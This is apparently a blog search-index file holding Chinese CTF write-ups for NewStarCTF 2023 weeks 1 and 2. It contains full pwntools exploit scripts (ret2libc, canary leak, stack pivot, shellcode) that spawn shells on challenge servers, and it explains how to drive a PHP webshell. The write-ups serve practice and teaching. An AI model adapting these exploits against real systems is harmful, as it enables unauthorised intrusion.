<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStarCTF 2023 week2 wp</title>
      <link href="/2023/10/17/NewStarCTF-2023-week2/"/>
      <url>/2023/10/17/NewStarCTF-2023-week2/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-Week2"><a href="#NewStarCTF-2023-Week2" class="headerlink" title="NewStarCTF 2023 Week2"></a>NewStarCTF 2023 Week2</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn:"></a>pwn:</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc:"></a>ret2libc:</h3><p>ret2lbc板子题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29115</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000400763</span></span><br><span class="line">ret=<span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line">main=<span class="number">0x400698</span></span><br><span class="line">pd=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,rdi,put_got,put_plt,main])</span><br><span class="line">sla(<span class="string">&#x27;again\n&#x27;</span>,pd)</span><br><span class="line">put_addr=get_libc()</span><br><span class="line">success(<span class="string">&#x27;put_addr:&#x27;</span>+<span class="built_in">hex</span>(put_addr))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,put_addr)</span></span><br><span class="line">libc_base=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pd=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,ret,rdi,bin_sh,system])</span><br><span class="line">sl(pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="canary："><a href="#canary：" class="headerlink" title="canary："></a>canary：</h3><p>利用格式化字符串泄露canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">p=process(<span class="string">&#x27;./canary&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29804</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Give me some gift?\n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;e is my gift:\n&#x27;</span>)</span><br><span class="line">can=<span class="built_in">int</span>(rc(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;can:&#x27;</span>+<span class="built_in">hex</span>(can))</span><br><span class="line">door=<span class="number">0x401262</span></span><br><span class="line">sla(<span class="string">&#x27;magic\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p64(can)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(door))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="secret-number："><a href="#secret-number：" class="headerlink" title="secret number："></a>secret number：</h3><p>利用time做随机数种子后”猜出随机数“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">p=process(<span class="string">&#x27;./secretnumber&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26591</span>)</span><br><span class="line">dll = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./secretnumber&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">time_seed=<span class="built_in">int</span>(time.time())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(time_seed))</span><br><span class="line">seed = dll.srand(time_seed)</span><br><span class="line">rand_num = <span class="built_in">str</span>(dll.rand())</span><br><span class="line">sla(<span class="string">&#x27;gift?(0/1)\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;number\n&#x27;</span>,<span class="built_in">str</span>(rand_num))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="stack-migration："><a href="#stack-migration：" class="headerlink" title="stack migration："></a>stack migration：</h3><p>利用栈空间未清空泄露libc，然后利用栈迁移getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">p=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25614</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27; name:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base=get_libc()-<span class="number">0x1e94a0</span></span><br><span class="line">success(<span class="string">&#x27;libc:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ru(<span class="string">&#x27;I have a small gift for you: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(rc(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">rdi=<span class="number">0x0000000000401333</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">lea_ret=<span class="number">0x00000000004012aa</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">pd=flat([<span class="number">0</span>,ret,rdi,bin_sh,system])</span><br><span class="line">pd=pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pd+=p64(stack)+p64(lea_ret)</span><br><span class="line">sla(<span class="string">&#x27;plz:\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc:"></a>misc:</h2><h3 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档:"></a>新建Word文档:</h3><p>把隐藏文字打开：</p><p><img src="/img/newstar2023/week2/1.png" alt="image-20231008232951451"></p><p><img src="/img/newstar2023/week2/2.png" alt="image-20231008233026412"></p><p>拿去新佛曰解密：</p><p><img src="/img/newstar2023/week2/3.png" alt="image-20231008233116212"></p><p>flag:flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</p><h3 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波:"></a>永不消逝的电波:</h3><p><img src="/img/newstar2023/week2/4.png" alt="image-20231008233238317"></p><p>看波形是摩斯加密，短的是点，长的是杆</p><p>翻译过来：</p><p>..-. .-.. .- –. - …. . -… . … - -.-. - ..-. . .-. .. … -.– — ..-</p><p><img src="/img/newstar2023/week2/5.png" alt="image-20231008233412617"></p><p>转成小写字母：flag{thebestctferisyou}</p><h3 id="base"><a href="#base" class="headerlink" title="base!:"></a>base!:</h3><p>用b神工具解一下：</p><p>是base隐写</p><p><img src="/img/newstar2023/week2/6.png" alt="image-20231008233700635"></p><p>得到：iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p><p>base58一下：</p><p>flag:flag{b4se_1s_4_g0od_c0d3}</p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章:"></a>1-序章:</h3><p>根据sql盲注的特点，当正确时进行下一个判断，一个一个对照（太麻烦了）得到flag：</p><p>flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</p><p>###WebShell的利用</p><p>直接拿那个字符串去base64、rot13、uuencode、rot13解码</p><p>得到：<img src="/img/newstar2023/week2/7.png" alt="image-20231012172049940"></p><p><code>error_reporting(0);</code>：是PHP中的错误报告控制函数。<code>error_reporting(0)</code> 用于禁用错误报告，这意味着在执行后续代码时，PHP将不会显示或记录任何错误消息。</p><p><code>($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;])</code>：这部分代码是使用 <code>($_GET[&#39;7d67973a&#39;])</code> 中获取的内容作为函数名，然后将 <code>($_POST[&#39;9fa3&#39;])</code> 中获取的内容作为函数的参数来执行这个函数。这也是一种动态调用函数的方式。</p><p>试一下system(ls)：</p><p><img src="/img/newstar2023/week2/8.png" alt="image-20231012172831197"></p><p>后面改成system(cat &#x2F;flag)就能得到flag了。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF 2023 week1 wp</title>
      <link href="/2023/10/02/NewStarCTF-2023-week1/"/>
      <url>/2023/10/02/NewStarCTF-2023-week1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-Week1"><a href="#NewStarCTF-2023-Week1" class="headerlink" title="NewStarCTF 2023 Week1"></a>NewStarCTF 2023 Week1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn:"></a>pwn:</h2><h3 id="ret2text："><a href="#ret2text：" class="headerlink" title="ret2text："></a>ret2text：</h3><p>简单的栈溢出题，没开canary和pie，有后门地址，直接溢出返回后门地址getshell</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26822</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Show me your magic\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x4011fb</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode:"></a>ezshellcode:</h3><p>没开沙箱什么的，写入长度也够长，写入0x66660000，0x66660000权限全开最后会jmp到0x66660000运行，因此直接写入shellcraft.sh()即可getshell。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ezshellcode&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28654</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezshellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sl(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop:"></a>newstar shop:</h3><p>整数溢出，买到shell才能getshell，但要9999，我们只有100，但是是int类型，在比较时又会变成unsorted int类型，如果我们减到负数，就能够购买shell了。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./shop&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26635</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./shop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee:"></a>p1eee:</h3><p>有个后门函数地址，但开了pie，还有个溢出，gdb调试发现返回地址跟后门函数就相差一个字节，因此覆盖最后一个字节即可</p><p>返回地址：</p><p><img src="/img/newstar2023/week1/1.png" alt="image-20230926140844537"></p><p>后门函数地址：<br><img src="/img/newstar2023/week1/2.png" alt="image-20230926141010776"></p><p>但由于栈平衡问题，要0x1269。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./p1eee&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26772</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./p1eee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;pie!!!\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span 